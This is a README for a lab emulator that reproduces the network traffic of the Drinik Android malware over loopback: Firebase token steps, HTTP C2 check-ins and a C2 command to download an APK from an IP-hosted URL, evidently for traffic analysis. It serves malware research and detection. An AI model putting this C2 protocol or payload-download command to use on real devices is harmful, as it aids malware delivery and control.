# Drinik traffic emulator

This lab generates the complete static-analysis sequence for Drinik:

1. Victim obtains Firebase Installation data over TLS.
2. Victim obtains an FCM registration token over TLS.
3. Victim reports `CMD=Token` to the HTTP C2.
4. C2 sends `data.CMD=DOWNLOADAPK:::http://192.3.124.14/AApk.apk` through the Firebase gateway.
5. Victim receives the command through a TLS mtalk-like channel.
6. Victim sends `CMD=insertServerCMD` to acknowledge command execution.
7. Victim downloads `/AApk.apk` over HTTP.
8. Victim sends the direct `CMD=insertServerCMD` message with `firstDownloadCompleted!`.
9. The dispatcher sends the generic execution acknowledgement for `SendMessage`.

## CoreDNS

Start CoreDNS from this directory in a separate terminal:

```powershell
coredns -conf .\coredns\Corefile
```

The Corefile binds DNS to `127.0.0.53:53` and maps the lab hostnames to separate loopback IPs.

## Run

```powershell
python .\main.py
```

If CoreDNS is not available and you only want to smoke-test the sequence without DNS traffic, use the static fallback:

```powershell
python .\main.py --allow-dns-fallback
```

For Wireshark TLS decryption, load the generated key log:

```text
runtime/sslkeys.log
```

## Notes

The emulator uses TLS for Firebase/Firebase Cloud Messaging traffic and clear HTTP for the Drinik C2 and APK download, matching the analysis flow. The Firebase HTTP API is implemented with Python's standard HTTP server stack, so the application-layer request is HTTP/1.1 over TLS. If an exact HTTP/2 wire image is required for the server-side FCM v1 API call, add an HTTP/2 implementation and keep the same request path and JSON body.
